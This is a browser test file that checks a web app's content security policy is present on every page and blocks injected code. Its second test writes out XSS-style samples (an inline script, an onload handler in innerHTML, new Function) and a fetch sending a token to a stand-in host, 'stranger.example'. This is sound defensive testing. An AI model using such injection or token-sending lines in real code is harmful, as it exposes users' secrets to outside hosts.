/**
 * The site's content security policy, which the build writes into every
 * page (`src/lib/app/security-policy.ts`).
 *
 * That the policy allows everything the app does is not tested here: every
 * other test fails if the browser refuses anything (`refused`, in
 * `helpers.ts`). This file checks that the policy is there, and that it
 * stops what it is there to stop.
 */

import { expect, test } from './helpers';

/** Every page the build writes out. */
const PAGES = [
	'/',
	'/logbook/',
	'/logbook/statistics/',
	'/logbook/flight/',
	'/settings/',
	'/settings/account/',
	'/settings/airspace/'
];

test('every page carries the policy, ahead of everything it loads', async ({ page }) => {
	for (const address of PAGES) {
		await page.goto(address);
		const policy = page.locator('meta[http-equiv="content-security-policy"]');
		await expect(policy).toHaveCount(1);
		const said = (await policy.getAttribute('content'))!;
		expect(said).toContain("default-src 'none'");
		// The app's own files, and the one script the build wrote into this page.
		expect(said).toMatch(/script-src 'self' 'sha256-[A-Za-z0-9+/=]+'(;|$)/);
		expect(said).not.toContain('unsafe-inline');
		expect(said).not.toContain('unsafe-eval');

		// A policy in a page holds for what comes after it.
		const loadedBefore = await policy.evaluate(
			(meta) =>
				[...document.querySelectorAll('link[href], script[src], img[src]')].filter((element) =>
					Boolean(meta.compareDocumentPosition(element) & Node.DOCUMENT_POSITION_PRECEDING)
				).length
		);
		expect(loadedBefore).toBe(0);
	}
});

test('a script written into a page does not run, and nothing is sent to a stranger', async ({
	page,
	refused
}) => {
	await page.goto('/settings/');
	await expect(page.getByRole('heading', { level: 1, name: 'Settings' })).toBeVisible();

	const did = await page.evaluate(async () => {
		const strangers = window as unknown as { ran?: string[] };
		strangers.ran = [];

		// A script element with text of its own.
		const script = document.createElement('script');
		script.textContent = 'window.ran.push("a script element")';
		document.head.append(script);

		// Markup with a handler, as text from a server could carry it.
		const holder = document.createElement('div');
		holder.innerHTML = '<img src="/favicon.svg" onload="window.ran.push(\'a handler\')">';
		document.body.append(holder);
		await new Promise((resolve) => setTimeout(resolve, 500));

		// Text made into code.
		let textAsCode = 'made';
		try {
			new Function('window.ran.push("text as code")')();
		} catch (error) {
			textAsCode = error instanceof EvalError ? 'refused' : String(error);
		}

		// What the app knows, sent to a host it does not use.
		const sent = await fetch('https://stranger.example/?token=secret').then(
			() => true,
			() => false
		);
		return { ran: strangers.ran, textAsCode, sent };
	});

	expect(did).toEqual({ ran: [], textAsCode: 'refused', sent: false });
	// Refused by the policy, each for its own reason, and not by chance. The
	// browser says so a moment after it has refused.
	const said = () => refused.join('\n');
	await expect.poll(said).toMatch(/script-src-elem refused inline/);
	await expect.poll(said).toMatch(/script-src-attr refused inline/);
	await expect
		.poll(said)
		.toMatch(/'https:\/\/stranger\.example\/\?token=secret' violates .*connect-src/);
	// These refusals were the point of the test.
	refused.length = 0;
});
